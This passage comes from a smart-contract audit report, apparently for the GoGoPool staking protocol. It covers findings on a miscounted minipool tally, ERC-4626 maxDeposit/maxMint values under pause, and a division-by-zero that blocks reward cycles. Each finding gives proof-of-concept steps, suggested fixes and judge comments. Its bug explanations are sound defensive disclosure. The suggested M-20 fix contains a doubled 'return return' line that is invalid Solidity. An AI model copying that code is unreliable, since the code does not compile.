d=\"M4 9h1v1H4c-1.5 0-3-1.69-3-3.5S2.55 3 4 3h4c1.45 0 3 1.69 3 3.5 0 1.41-.91 2.72-2 3.25V8.59c.58-.45 1-1.27 1-2.09C10 5.22 8.98 4 8 4H4c-.98 0-2 1.22-2 2.5S3 9 4 9zm9-3h-1v1h1c1 0 2 1.22 2 2.5S13.98 12 13 12H9c-.98 0-2-1.22-2-2.5 0-.83.42-1.64 1-2.09V6.25c-1.09.53-2 1.84-2 3.25C6 11.31 7.55 13 9 13h4c1.45 0 3-1.69 3-3.5S14.5 6 13 6z\"></path></svg></a>Tools Used</h3>\n<p>VSCode</p>\n<h3 id=\"recommended-mitigation-steps-24\" style=\"position:relative;\"><a href=\"#recommended-mitigation-steps-24\" aria-label=\"recommended mitigation steps 24 permalink\" class=\"anchor before\"><svg aria-hidden=\"true\" focusable=\"false\" height=\"16\" version=\"1.1\" viewBox=\"0 0 16 16\" width=\"16\"><path fill-rule=\"evenodd\" d=\"M4 9h1v1H4c-1.5 0-3-1.69-3-3.5S2.55 3 4 3h4c1.45 0 3 1.69 3 3.5 0 1.41-.91 2.72-2 3.25V8.59c.58-.45 1-1.27 1-2.09C10 5.22 8.98 4 8 4H4c-.98 0-2 1.22-2 2.5S3 9 4 9zm9-3h-1v1h1c1 0 2 1.22 2 2.5S13.98 12 13 12H9c-.98 0-2-1.22-2-2.5 0-.83.42-1.64 1-2.09V6.25c-1.09.53-2 1.84-2 3.25C6 11.31 7.55 13 9 13h4c1.45 0 3-1.69 3-3.5S14.5 6 13 6z\"></path></svg></a>Recommended Mitigation Steps</h3>\n<p>You need to simply add the line <code>staking.decreaseMinipoolCount(owner);</code> to the <code>MinipoolManager.recordStakingError</code> function.</p>\n<p><strong><a href=\"https://github.com/code-423n4/2022-12-gogopool-findings/issues/235\">0xju1ie (GoGoPool) confirmed</a></strong></p>\n<p><strong><a href=\"https://github.com/code-423n4/2022-12-gogopool-findings/issues/235#issuecomment-1410538395\">Alex the Entreprenerd (judge) commented</a>:</strong></p>\n<blockquote>\n<p>The Warden has shown how, calling <code>recordStakingError</code> will not decrease the <code>minipoolCount</code>.</p>\n<p>This will not only impact view functions but also impact Yield calculations.</p>\n<p>For this reason, I agree with Medium Severity.</p>\n</blockquote>\n<p><strong><a href=\"https://github.com/code-423n4/2023-02-gogopool-mitigation-contest#mitigations-to-be-reviewed\">emersoncloud (GoGoPool) mitigated</a>:</strong></p>\n<blockquote>\n<p>We removed minipool count entirely: <a href=\"https://github.com/multisig-labs/gogopool/pull/42\">multisig-labs/gogopool#42</a></p>\n</blockquote>\n<p><strong>Status:</strong> Mitigation confirmed by <a href=\"https://github.com/code-423n4/2023-02-gogopool-mitigation-contest-findings/issues/59\">RaymondFam</a> and <a href=\"https://github.com/code-423n4/2023-02-gogopool-mitigation-contest-findings/issues/44\">hansfriese</a>.</p>\n<hr>\n<h2 id=\"m-20-tokenggavax-maxdeposit-and-maxmint-return-wrong-value-when-contract-is-paused\" style=\"position:relative;\"><a href=\"#m-20-tokenggavax-maxdeposit-and-maxmint-return-wrong-value-when-contract-is-paused\" aria-label=\"m 20 tokenggavax maxdeposit and maxmint return wrong value when contract is paused permalink\" class=\"anchor before\"><svg aria-hidden=\"true\" focusable=\"false\" height=\"16\" version=\"1.1\" viewBox=\"0 0 16 16\" width=\"16\"><path fill-rule=\"evenodd\" d=\"M4 9h1v1H4c-1.5 0-3-1.69-3-3.5S2.55 3 4 3h4c1.45 0 3 1.69 3 3.5 0 1.41-.91 2.72-2 3.25V8.59c.58-.45 1-1.27 1-2.09C10 5.22 8.98 4 8 4H4c-.98 0-2 1.22-2 2.5S3 9 4 9zm9-3h-1v1h1c1 0 2 1.22 2 2.5S13.98 12 13 12H9c-.98 0-2-1.22-2-2.5 0-.83.42-1.64 1-2.09V6.25c-1.09.53-2 1.84-2 3.25C6 11.31 7.55 13 9 13h4c1.45 0 3-1.69 3-3.5S14.5 6 13 6z\"></path></svg></a><a href=\"https://github.com/code-423n4/2022-12-gogopool-findings/issues/144\">[M-20] TokenggAVAX: maxDeposit and maxMint return wrong value when contract is paused</a></h2>\n<p><em>Submitted by <a href=\"https://github.com/code-423n4/2022-12-gogopool-findings/issues/144\">HollaDieWaldfee</a>, also found by <a href=\"https://github.com/code-423n4/2022-12-gogopool-findings/issues/247\">aviggiano</a></em></p>\n<p>The <code>TokenggAVAX</code> contract (<a href=\"https://github.com/code-423n4/2022-12-gogopool/blob/aec9928d8bdce8a5a4efe45f54c39d4fc7313731/contracts/contract/tokens/TokenggAVAX.sol#L24\">https://github.com/code-423n4/2022-12-gogopool/blob/aec9928d8bdce8a5a4efe45f54c39d4fc7313731/contracts/contract/tokens/TokenggAVAX.sol#L24</a>) can be paused.</p>\n<p>The <code>whenTokenNotPaused</code> modifier is applied to the following functions (<a href=\"https://github.com/code-423n4/2022-12-gogopool/blob/aec9928d8bdce8a5a4efe45f54c39d4fc7313731/contracts/contract/tokens/TokenggAVAX.sol#L225-L239\">https://github.com/code-423n4/2022-12-gogopool/blob/aec9928d8bdce8a5a4efe45f54c39d4fc7313731/contracts/contract/tokens/TokenggAVAX.sol#L225-L239</a>):<br>\n<code>previewDeposit</code>, <code>previewMint</code>, <code>previewWithdraw</code> and <code>previewRedeem</code></p>\n<p>Thereby any calls to functions that deposit or withdraw funds revert.</p>\n<p>There are two functions (<code>maxWithdraw</code> and <code>maxRedeem</code>) that calculate the max amount that can be withdrawn or redeemed respectively.</p>\n<p>Both functions return <code>0</code> if the <code>TokenggAVAX</code> contract is paused.</p>\n<p>The issue is that <code>TokenggAVAX</code> does not override the <code>maxDeposit</code> and <code>maxMint</code> functions (<a href=\"https://github.com/code-423n4/2022-12-gogopool/blob/aec9928d8bdce8a5a4efe45f54c39d4fc7313731/contracts/contract/tokens/upgradeable/ERC4626Upgradeable.sol#L156-L162\">https://github.com/code-423n4/2022-12-gogopool/blob/aec9928d8bdce8a5a4efe45f54c39d4fc7313731/contracts/contract/tokens/upgradeable/ERC4626Upgradeable.sol#L156-L162</a>) in the <code>ERC4626Upgradable</code> contract like it does for <code>maxWithdraw</code> and <code>maxRedeem</code>.</p>\n<p>Thereby these two functions return a value that cannot actually be deposited or minted.</p>\n<p>This can cause any components that rely on any of these functions to return a correct value to malfunction.</p>\n<p>So <code>maxDeposit</code> and <code>maxMint</code> should return the value <code>0</code> when <code>TokenggAVAX</code> is paused.</p>\n<h3 id=\"proof-of-concept-24\" style=\"position:relative;\"><a href=\"#proof-of-concept-24\" aria-label=\"proof of concept 24 permalink\" class=\"anchor before\"><svg aria-hidden=\"true\" focusable=\"false\" height=\"16\" version=\"1.1\" viewBox=\"0 0 16 16\" width=\"16\"><path fill-rule=\"evenodd\" d=\"M4 9h1v1H4c-1.5 0-3-1.69-3-3.5S2.55 3 4 3h4c1.45 0 3 1.69 3 3.5 0 1.41-.91 2.72-2 3.25V8.59c.58-.45 1-1.27 1-2.09C10 5.22 8.98 4 8 4H4c-.98 0-2 1.22-2 2.5S3 9 4 9zm9-3h-1v1h1c1 0 2 1.22 2 2.5S13.98 12 13 12H9c-.98 0-2-1.22-2-2.5 0-.83.42-1.64 1-2.09V6.25c-1.09.53-2 1.84-2 3.25C6 11.31 7.55 13 9 13h4c1.45 0 3-1.69 3-3.5S14.5 6 13 6z\"></path></svg></a>Proof of Concept</h3>\n<ol>\n<li>The <code>TokenggAVAX</code> contract is paused by calling <code>Ocyticus.pauseEverything</code> (<a href=\"https://github.com/code-423n4/2022-12-gogopool/blob/aec9928d8bdce8a5a4efe45f54c39d4fc7313731/contracts/contract/Ocyticus.sol#L37-L43\">https://github.com/code-423n4/2022-12-gogopool/blob/aec9928d8bdce8a5a4efe45f54c39d4fc7313731/contracts/contract/Ocyticus.sol#L37-L43</a>)</li>\n<li><code>TokenggAVAX.maxDeposit</code> returns <code>type(uint256).max</code> (<a href=\"https://github.com/code-423n4/2022-12-gogopool/blob/aec9928d8bdce8a5a4efe45f54c39d4fc7313731/contracts/contract/tokens/upgradeable/ERC4626Upgradeable.sol#L157\">https://github.com/code-423n4/2022-12-gogopool/blob/aec9928d8bdce8a5a4efe45f54c39d4fc7313731/contracts/contract/tokens/upgradeable/ERC4626Upgradeable.sol#L157</a>)</li>\n<li>However <code>deposit</code> cannot be called with this value because it is paused (<code>previewDeposit</code> reverts because of the <code>whenTokenNotPaused</code> modifier) (<a href=\"https://github.com/code-423n4/2022-12-gogopool/blob/aec9928d8bdce8a5a4efe45f54c39d4fc7313731/contracts/contract/tokens/upgradeable/ERC4626Upgradeable.sol#L44\">https://github.com/code-423n4/2022-12-gogopool/blob/aec9928d8bdce8a5a4efe45f54c39d4fc7313731/contracts/contract/tokens/upgradeable/ERC4626Upgradeable.sol#L44</a>)</li>\n</ol>\n<h3 id=\"tools-used-15\" style=\"position:relative;\"><a href=\"#tools-used-15\" aria-label=\"tools used 15 permalink\" class=\"anchor before\"><svg aria-hidden=\"true\" focusable=\"false\" height=\"16\" version=\"1.1\" viewBox=\"0 0 16 16\" width=\"16\"><path fill-rule=\"evenodd\" d=\"M4 9h1v1H4c-1.5 0-3-1.69-3-3.5S2.55 3 4 3h4c1.45 0 3 1.69 3 3.5 0 1.41-.91 2.72-2 3.25V8.59c.58-.45 1-1.27 1-2.09C10 5.22 8.98 4 8 4H4c-.98 0-2 1.22-2 2.5S3 9 4 9zm9-3h-1v1h1c1 0 2 1.22 2 2.5S13.98 12 13 12H9c-.98 0-2-1.22-2-2.5 0-.83.42-1.64 1-2.09V6.25c-1.09.53-2 1.84-2 3.25C6 11.31 7.55 13 9 13h4c1.45 0 3-1.69 3-3.5S14.5 6 13 6z\"></path></svg></a>Tools Used</h3>\n<p>VSCode</p>\n<h3 id=\"recommended-mitigation-steps-25\" style=\"position:relative;\"><a href=\"#recommended-mitigation-steps-25\" aria-label=\"recommended mitigation steps 25 permalink\" class=\"anchor before\"><svg aria-hidden=\"true\" focusable=\"false\" height=\"16\" version=\"1.1\" viewBox=\"0 0 16 16\" width=\"16\"><path fill-rule=\"evenodd\" d=\"M4 9h1v1H4c-1.5 0-3-1.69-3-3.5S2.55 3 4 3h4c1.45 0 3 1.69 3 3.5 0 1.41-.91 2.72-2 3.25V8.59c.58-.45 1-1.27 1-2.09C10 5.22 8.98 4 8 4H4c-.98 0-2 1.22-2 2.5S3 9 4 9zm9-3h-1v1h1c1 0 2 1.22 2 2.5S13.98 12 13 12H9c-.98 0-2-1.22-2-2.5 0-.83.42-1.64 1-2.09V6.25c-1.09.53-2 1.84-2 3.25C6 11.31 7.55 13 9 13h4c1.45 0 3-1.69 3-3.5S14.5 6 13 6z\"></path></svg></a>Recommended Mitigation Steps</h3>\n<p>The <code>maxDeposit</code> and <code>maxMint</code> functions should be overridden by <code>TokenggAVAX</code> just like <code>maxWithdraw</code> and <code>maxRedeem</code> are overridden and return <code>0</code> when the contract is paused (<a href=\"https://github.com/code-423n4/2022-12-gogopool/blob/aec9928d8bdce8a5a4efe45f54c39d4fc7313731/contracts/contract/tokens/TokenggAVAX.sol#L206-L223\">https://github.com/code-423n4/2022-12-gogopool/blob/aec9928d8bdce8a5a4efe45f54c39d4fc7313731/contracts/contract/tokens/TokenggAVAX.sol#L206-L223</a>).</p>\n<p>So add these two functions to the <code>TokenggAVAX</code> contract:</p>\n<pre class=\"grvsc-container dark-default-dark\" data-language=\"solidity\" data-index=\"73\"><code class=\"grvsc-code\"><span class=\"grvsc-line\"><span class=\"grvsc-source\"><span class=\"mtk4\">function</span><span class=\"mtk1\"> </span><span class=\"mtk11\">maxDeposit</span><span class=\"mtk1\">(</span><span class=\"mtk12\">address</span><span class=\"mtk1\">) </span><span class=\"mtk11\">public</span><span class=\"mtk1\"> </span><span class=\"mtk11\">view</span><span class=\"mtk1\"> </span><span class=\"mtk11\">override</span><span class=\"mtk1\"> </span><span class=\"mtk11\">returns</span><span class=\"mtk1\"> (</span><span class=\"mtk12\">uint256</span><span class=\"mtk1\">) {</span></span></span>\n<span class=\"grvsc-line\"><span class=\"grvsc-source\"><span class=\"mtk1\">    </span><span class=\"mtk15\">if</span><span class=\"mtk1\"> (</span><span class=\"mtk11\">getBool</span><span class=\"mtk1\">(</span><span class=\"mtk11\">keccak256</span><span class=\"mtk1\">(</span><span class=\"mtk12\">abi</span><span class=\"mtk1\">.</span><span class=\"mtk11\">encodePacked</span><span class=\"mtk1\">(</span><span class=\"mtk8\">&quot;contract.paused&quot;</span><span class=\"mtk1\">, </span><span class=\"mtk8\">&quot;TokenggAVAX&quot;</span><span class=\"mtk1\">)))) {</span></span></span>\n<span class=\"grvsc-line\"><span class=\"grvsc-source\"><span class=\"mtk1\">        </span><span class=\"mtk15\">return</span><span class=\"mtk1\"> </span><span class=\"mtk7\">0</span><span class=\"mtk1\">;</span></span></span>\n<span class=\"grvsc-line\"><span class=\"grvsc-source\"><span class=\"mtk1\">    }</span></span></span>\n<span class=\"grvsc-line\"><span class=\"grvsc-source\"><span class=\"mtk1\">    </span><span class=\"mtk15\">return</span><span class=\"mtk1\"> </span><span class=\"mtk15\">return</span><span class=\"mtk1\"> </span><span class=\"mtk11\">type</span><span class=\"mtk1\">(</span><span class=\"mtk12\">uint256</span><span class=\"mtk1\">).</span><span class=\"mtk12\">max</span><span class=\"mtk1\">;</span></span></span>\n<span class=\"grvsc-line\"><span class=\"grvsc-source\"><span class=\"mtk1\">}</span></span></span>\n<span class=\"grvsc-line\"><span class=\"grvsc-source\"></span></span>\n<span class=\"grvsc-line\"><span class=\"grvsc-source\"><span class=\"mtk4\">function</span><span class=\"mtk1\"> </span><span class=\"mtk11\">maxMint</span><span class=\"mtk1\">(</span><span class=\"mtk12\">address</span><span class=\"mtk1\">) </span><span class=\"mtk11\">public</span><span class=\"mtk1\"> </span><span class=\"mtk11\">view</span><span class=\"mtk1\"> </span><span class=\"mtk11\">override</span><span class=\"mtk1\"> </span><span class=\"mtk11\">returns</span><span class=\"mtk1\"> (</span><span class=\"mtk12\">uint256</span><span class=\"mtk1\">) {</span></span></span>\n<span class=\"grvsc-line\"><span class=\"grvsc-source\"><span class=\"mtk1\">    </span><span class=\"mtk15\">if</span><span class=\"mtk1\"> (</span><span class=\"mtk11\">getBool</span><span class=\"mtk1\">(</span><span class=\"mtk11\">keccak256</span><span class=\"mtk1\">(</span><span class=\"mtk12\">abi</span><span class=\"mtk1\">.</span><span class=\"mtk11\">encodePacked</span><span class=\"mtk1\">(</span><span class=\"mtk8\">&quot;contract.paused&quot;</span><span class=\"mtk1\">, </span><span class=\"mtk8\">&quot;TokenggAVAX&quot;</span><span class=\"mtk1\">)))) {</span></span></span>\n<span class=\"grvsc-line\"><span class=\"grvsc-source\"><span class=\"mtk1\">        </span><span class=\"mtk15\">return</span><span class=\"mtk1\"> </span><span class=\"mtk7\">0</span><span class=\"mtk1\">;</span></span></span>\n<span class=\"grvsc-line\"><span class=\"grvsc-source\"><span class=\"mtk1\">    }</span></span></span>\n<span class=\"grvsc-line\"><span class=\"grvsc-source\"><span class=\"mtk1\">    </span><span class=\"mtk15\">return</span><span class=\"mtk1\"> </span><span class=\"mtk15\">return</span><span class=\"mtk1\"> </span><span class=\"mtk11\">type</span><span class=\"mtk1\">(</span><span class=\"mtk12\">uint256</span><span class=\"mtk1\">).</span><span class=\"mtk12\">max</span><span class=\"mtk1\">;</span></span></span>\n<span class=\"grvsc-line\"><span class=\"grvsc-source\"><span class=\"mtk1\">}</span></span></span></code></pre>\n<p><strong><a href=\"https://github.com/code-423n4/2022-12-gogopool-findings/issues/144#issuecomment-1372623332\">Alex the Entreprenerd (judge) commented</a>:</strong></p>\n<blockquote>\n<p>Looks off, the modifiers will revert on pause, not return 0.</p>\n</blockquote>\n<p><strong><a href=\"https://github.com/code-423n4/2022-12-gogopool-findings/issues/144#issuecomment-1396711908\">0xju1ie (GoGoPool) disagreed with severity and commented</a>:</strong></p>\n<blockquote>\n<p>I’d say Low: <code>(e.g. assets are not at risk: state handling, function incorrect as to spec, issues with comments). Excludes Gas optimizations, which are submitted and judged separately.</code></p>\n</blockquote>\n<p><strong><a href=\"https://github.com/code-423n4/2022-12-gogopool-findings/issues/144#issuecomment-1396712353\">emersoncloud (GoGoPool) commented</a>:</strong></p>\n<blockquote>\n<p>Good catch, I think we should override those for consistency at least but there’s no way to exploit to lose assets. Agreed that QA makes sense. </p>\n</blockquote>\n<p><strong><a href=\"https://github.com/code-423n4/2022-12-gogopool-findings/issues/144#issuecomment-1410419042\">Alex the Entreprenerd (judge) decreased severity to Low and commented</a>:</strong></p>\n<blockquote>\n<p>By definition, the finding is Informational in Nature.</p>\n<p>Because of the relevancy, I’m awarding it QA - Low</p>\n</blockquote>\n<p><strong><a href=\"https://github.com/code-423n4/2022-12-gogopool-findings/issues/144#issuecomment-1411061391\">Alex the Entreprenerd (judge) increased severity to Medium and commented</a>:</strong></p>\n<blockquote>\n<p>I had a change of heart on this issue, because this pertains to a standard that is being implemented.</p>\n<p>For that reason am going to award Medium Severity, because the function breaks the standard, and historically we have awarded similar findings (e..g broken ERC20, broken ERC721 standard), with Medium.</p>\n<p>The Warden has shown an inconsistency between the ERC-4626 Spec and the implementation done by the sponsor, while technically this is an informational finding, the fact that a standard was broken warrants a higher severity, leading me to believe that Medium is a more appropriate Severity.</p>\n<p>Am making this decision because the Sponsor is following the standard, and the implementation of these functions is not consistent with it.</p>\n</blockquote>\n<p><strong><a href=\"https://github.com/code-423n4/2023-02-gogopool-mitigation-contest#mitigations-to-be-reviewed\">emersoncloud (GoGoPool) mitigated</a>:</strong></p>\n<blockquote>\n<p>Return correct value from maxMint and maxDeposit when the contract is paused: <a href=\"https://github.com/multisig-labs/gogopool/pull/33\">multisig-labs/gogopool#33</a></p>\n</blockquote>\n<p><strong>Status:</strong> Mitigation confirmed by <a href=\"https://github.com/code-423n4/2023-02-gogopool-mitigation-contest-findings/issues/60\">RaymondFam</a> and <a href=\"https://github.com/code-423n4/2023-02-gogopool-mitigation-contest-findings/issues/45\">hansfriese</a>.</p>\n<hr>\n<h2 id=\"m-21-division-by-zero-error-can-block-rewardspoolstartrewardcycle-if-all-multisig-wallet-are-disabled\" style=\"position:relative;\"><a href=\"#m-21-division-by-zero-error-can-block-rewardspoolstartrewardcycle-if-all-multisig-wallet-are-disabled\" aria-label=\"m 21 division by zero error can block rewardspoolstartrewardcycle if all multisig wallet are disabled permalink\" class=\"anchor before\"><svg aria-hidden=\"true\" focusable=\"false\" height=\"16\" version=\"1.1\" viewBox=\"0 0 16 16\" width=\"16\"><path fill-rule=\"evenodd\" d=\"M4 9h1v1H4c-1.5 0-3-1.69-3-3.5S2.55 3 4 3h4c1.45 0 3 1.69 3 3.5 0 1.41-.91 2.72-2 3.25V8.59c.58-.45 1-1.27 1-2.09C10 5.22 8.98 4 8 4H4c-.98 0-2 1.22-2 2.5S3 9 4 9zm9-3h-1v1h1c1 0 2 1.22 2 2.5S13.98 12 13 12H9c-.98 0-2-1.22-2-2.5 0-.83.42-1.64 1-2.09V6.25c-1.09.53-2 1.84-2 3.25C6 11.31 7.55 13 9 13h4c1.45 0 3-1.69 3-3.5S14.5 6 13 6z\"></path></svg></a><a href=\"https://github.com/code-423n4/2022-12-gogopool-findings/issues/143\">[M-21] Division by zero error can block <code>RewardsPool#startRewardCycle</code> if all multisig wallet are disabled</a></h2>\n<p><em>Submitted by <a href=\"https://github.com/code-423n4/2022-12-gogopool-findings/issues/143\">ladboy233</a>, also found by <a href=\"undefined\">pauliax</a>, <a href=\"https://github.com/code-423n4/2022-12-gogopool-findings/issues/839\">unforgiven</a>, <a href=\"https://github.com/code-423n4/2022-12-gogopool-findings/issues/638\">__141345__</a>, <a href=\"https://github.com/code-423n4/2022-12-gogopool-findings/issues/599\">peakbolt</a>, and <a href=\"https://github.com/code-423n4/2022-12-gogopool-findings/issues/240\">rvierdiiev</a></em></p>\n<p><a href=\"https://github.com/code-423n4/2022-12-gogopool/blob/aec9928d8bdce8a5a4efe45f54c39d4fc7313731/contracts/contract/RewardsPool.sol#L229\">https://github.com/code-423n4/2022-12-gogopool/blob/aec9928d8bdce8a5a4efe45f54c39d4fc7313731/contracts/contract/RewardsPool.sol#L229</a><br>\n<a href=\"https://github.com/code-423n4/2022-12-gogopool/blob/aec9928d8bdce8a5a4efe45f54c39d4fc7313731/contracts/contract/RewardsPool.sol#L156\">https://github.com/code-423n4/2022-12-gogopool/blob/aec9928d8bdce8a5a4efe45f54c39d4fc7313731/contracts/contract/RewardsPool.sol#L156</a></p>\n<p>A user needs to call the function startRewardsCycle in RewardsPool.sol</p>\n<pre class=\"grvsc-container dark-default-dark\" data-language=\"solidity\" data-index=\"74\"><code class=\"grvsc-code\"><span class=\"grvsc-line\"><span class=\"grvsc-source\"><span class=\"mtk3\">/// @notice Public function that will run a GGP rewards cycle if possible</span></span></span>\n<span class=\"grvsc-line\"><span class=\"grvsc-source\"><span class=\"mtk4\">function</span><span class=\"mtk1\"> </span><span class=\"mtk11\">startRewardsCycle</span><span class=\"mtk1\">() </span><span class=\"mtk11\">external</span><span class=\"mtk1\"> {</span></span></span></code></pre>\n<p>which calls:</p>\n<pre class=\"grvsc-container dark-default-dark\" data-language=\"solidity\" data-index=\"75\"><code class=\"grvsc-code\"><span class=\"grvsc-line\"><span class=\"grvsc-source\"><span class=\"mtk12\">uint256</span><span class=\"mtk1\"> </span><span class=\"mtk12\">multisigClaimContractAllotment</span><span class=\"mtk1\"> = </span><span class=\"mtk11\">getClaimingContractDistribution</span><span class=\"mtk1\">(</span><span class=\"mtk8\">&quot;ClaimMultisig&quot;</span><span class=\"mtk1\">);</span></span></span>\n<span class=\"grvsc-line\"><span class=\"grvsc-source\"><span class=\"mtk12\">uint256</span><span class=\"mtk1\"> </span><span class=\"mtk12\">nopClaimContractAllotment</span><span class=\"mtk1\"> = </span><span class=\"mtk11\">getClaimingContractDistribution</span><span class=\"mtk1\">(</span><span class=\"mtk8\">&quot;ClaimNodeOp&quot;</span><span class=\"mtk1\">);</span></span></span>\n<span class=\"grvsc-line\"><span class=\"grvsc-source\"><span class=\"mtk12\">uint256</span><span class=\"mtk1\"> </span><span class=\"mtk12\">daoClaimContractAllotment</span><span class=\"mtk1\"> = </span><span class=\"mtk11\">getClaimingContractDistribution</span><span class=\"mtk1\">(</span><span class=\"mtk8\">&quot;ClaimProtocolDAO&quot;</span><span class=\"mtk1\">);</span></span></span>\n<span class=\"grvsc-line\"><span class=\"grvsc-source\"><span class=\"mtk15\">if</span><span class=\"mtk1\"> (</span><span class=\"mtk12\">daoClaimContractAllotment</span><span class=\"mtk1\"> + </span><span class=\"mtk12\">nopClaimContractAllotment</span><span class=\"mtk1\"> + </span><span class=\"mtk12\">multisigClaimContractAllotment</span><span class=\"mtk1\"> &gt; </span><span class=\"mtk11\">getRewardsCycleTotalAmt</span><span class=\"mtk1\">()) {</span></span></span>\n<span class=\"grvsc-line\"><span class=\"grvsc-source\"><span class=\"mtk1\">\t</span><span class=\"mtk12\">revert</span><span class=\"mtk1\"> </span><span class=\"mtk11\">IncorrectRewardsDistribution</span><span class=\"mtk1\">();</span></span></span>\n<span class=\"grvsc-line\"><span class=\"grvsc-source\"><span class=\"mtk1\">}</span></span></span>\n<span class=\"grvsc-line\"><span class=\"grvsc-source\"></span></span>\n<span class=\"grvsc-line\"><span class=\"grvsc-source\"><span class=\"mtk12\">TokenGGP</span><span class=\"mtk1\"> </span><span class=\"mtk12\">ggp</span><span class=\"mtk1\"> = </span><span class=\"mtk11\">TokenGGP</span><span class=\"mtk1\">(</span><span class=\"mtk11\">getContractAddress</span><span class=\"mtk1\">(</span><span class=\"mtk8\">&quot;TokenGGP&quot;</span><span class=\"mtk1\">));</span></span></span>\n<span class=\"grvsc-line\"><span class=\"grvsc-source\"><span class=\"mtk12\">Vault</span><span class=\"mtk1\"> </span><span class=\"mtk12\">vault</span><span class=\"mtk1\"> = </span><span class=\"mtk11\">Vault</span><span class=\"mtk1\">(</span><span class=\"mtk11\">getContractAddress</span><span class=\"mtk1\">(</span><span class=\"mtk8\">&quot;Vault&quot;</span><span class=\"mtk1\">));</span></span></span>\n<span class=\"grvsc-line\"><span class=\"grvsc-source\"></span></span>\n<span class=\"grvsc-line\"><span class=\"grvsc-source\"><span class=\"mtk15\">if</span><span class=\"mtk1\"> (</span><span class=\"mtk12\">daoClaimContractAllotment</span><span class=\"mtk1\"> &gt; </span><span class=\"mtk7\">0</span><span class=\"mtk1\">) {</span></span></span>\n<span class=\"grvsc-line\"><span class=\"grvsc-source\"><span class=\"mtk1\">\t</span><span class=\"mtk12\">emit</span><span class=\"mtk1\"> </span><span class=\"mtk11\">ProtocolDAORewardsTransfered</span><span class=\"mtk1\">(</span><span class=\"mtk12\">daoClaimContractAllotment</span><span class=\"mtk1\">);</span></span></span>\n<span class=\"grvsc-line\"><span class=\"grvsc-source\"><span class=\"mtk1\">\t</span><span class=\"mtk12\">vault</span><span class=\"mtk1\">.</span><span class=\"mtk11\">transferToken</span><span class=\"mtk1\">(</span><span class=\"mtk8\">&quot;ClaimProtocolDAO&quot;</span><span class=\"mtk1\">, </span><span class=\"mtk12\">ggp</span><span class=\"mtk1\">, </span><span class=\"mtk12\">daoClaimContractAllotment</span><span class=\"mtk1\">);</span></span></span>\n<span class=\"grvsc-line\"><span class=\"grvsc-source\"><span class=\"mtk1\">}</span></span></span>\n<span class=\"grvsc-line\"><span class=\"grvsc-source\"></span></span>\n<span class=\"grvsc-line\"><span class=\"grvsc-source\"><span class=\"mtk15\">if</span><span class=\"mtk1\"> (</span><span class=\"mtk12\">multisigClaimContractAllotment</span><span class=\"mtk1\"> &gt; </span><span class=\"mtk7\">0</span><span class=\"mtk1\">) {</span></span></span>\n<span class=\"grvsc-line\"><span class=\"grvsc-source\"><span class=\"mtk1\">\t</span><span class=\"mtk12\">emit</span><span class=\"mtk1\"> </span><span class=\"mtk11\">MultisigRewardsTransfered</span><span class=\"mtk1\">(</span><span class=\"mtk12\">multisigClaimContractAllotment</span><span class=\"mtk1\">);</span></span></span>\n<span class=\"grvsc-line\"><span class=\"grvsc-source\"><span class=\"mtk1\">\t</span><span class=\"mtk11\">distributeMultisigAllotment</span><span class=\"mtk1\">(</span><span class=\"mtk12\">multisigClaimContractAllotment</span><span class=\"mtk1\">, </span><span class=\"mtk12\">vault</span><span class=\"mtk1\">, </span><span class=\"mtk12\">ggp</span><span class=\"mtk1\">);</span></span></span>\n<span class=\"grvsc-line\"><span class=\"grvsc-source\"><span class=\"mtk1\">}</span></span></span>\n<span class=\"grvsc-line\"><span class=\"grvsc-source\"></span></span>\n<span class=\"grvsc-line\"><span class=\"grvsc-source\"><span class=\"mtk15\">if</span><span class=\"mtk1\"> (</span><span class=\"mtk12\">nopClaimContractAllotment</span><span class=\"mtk1\"> &gt; </span><span class=\"mtk7\">0</span><span class=\"mtk1\">) {</span></span></span>\n<span class=\"grvsc-line\"><span class=\"grvsc-source\"><span class=\"mtk1\">\t</span><span class=\"mtk12\">emit</span><span class=\"mtk1\"> </span><span class=\"mtk11\">ClaimNodeOpRewardsTransfered</span><span class=\"mtk1\">(</span><span class=\"mtk12\">nopClaimContractAllotment</span><span class=\"mtk1\">);</span></span></span>\n<span class=\"grvsc-line\"><span class=\"grvsc-source\"><span class=\"mtk1\">\t</span><span class=\"mtk12\">ClaimNodeOp</span><span class=\"mtk1\"> </span><span class=\"mtk12\">nopClaim</span><span class=\"mtk1\"> = </span><span class=\"mtk11\">ClaimNodeOp</span><span class=\"mtk1\">(</span><span class=\"mtk11\">getContractAddress</span><span class=\"mtk1\">(</span><span class=\"mtk8\">&quot;ClaimNodeOp&quot;</span><span class=\"mtk1\">));</span></span></span>\n<span class=\"grvsc-line\"><span class=\"grvsc-source\"><span class=\"mtk1\">\t</span><span class=\"mtk12\">nopClaim</span><span class=\"mtk1\">.</span><span class=\"mtk11\">setRewardsCycleTotal</span><span class=\"mtk1\">(</span><span class=\"mtk12\">nopClaimContractAllotment</span><span class=\"mtk1\">);</span></span></span>\n<span class=\"grvsc-line\"><span class=\"grvsc-source\"><span class=\"mtk1\">\t</span><span class=\"mtk12\">vault</span><span class=\"mtk1\">.</span><span class=\"mtk11\">transferToken</span><span class=\"mtk1\">(</span><span class=\"mtk8\">&quot;ClaimNodeOp&quot;</span><span class=\"mtk1\">, </span><span class=\"mtk12\">ggp</span><span class=\"mtk1\">, </span><span class=\"mtk12\">nopClaimContractAllotment</span><span class=\"mtk1\">);</span></span></span>\n<span class=\"grvsc-line\"><span class=\"grvsc-source\"><span class=\"mtk1\">}</span></span></span></code></pre>\n<p>We need to pay special attention to the code block below:</p>\n<pre class=\"grvsc-container dark-default-dark\" data-language=\"solidity\" data-index=\"76\"><code class=\"grvsc-code\"><span class=\"grvsc-line\"><span class=\"grvsc-source\"><span class=\"mtk15\">if</span><span class=\"mtk1\"> (</span><span class=\"mtk12\">multisigClaimContractAllotment</span><span class=\"mtk1\"> &gt; </span><span class=\"mtk7\">0</span><span class=\"mtk1\">) {</span></span></span>\n<span class=\"grvsc-line\"><span class=\"grvsc-source\"><span class=\"mtk1\">\t</span><span class=\"mtk12\">emit</span><span class=\"mtk1\"> </span><span class=\"mtk11\">MultisigRewardsTransfered</span><span class=\"mtk1\">(</span><span class=\"mtk12\">multisigClaimContractAllotment</span><span class=\"mtk1\">);</span></span></span>\n<span class=\"grvsc-line\"><span class=\"grvsc-source\"><span class=\"mtk1\">\t</span><span class=\"mtk11\">distributeMultisigAllotment</span><span class=\"mtk1\">(</span><span class=\"mtk12\">multisigClaimContractAllotment</span><span class=\"mtk1\">, </span><span class=\"mtk12\">vault</span><span class=\"mtk1\">, </span><span class=\"mtk12\">ggp</span><span 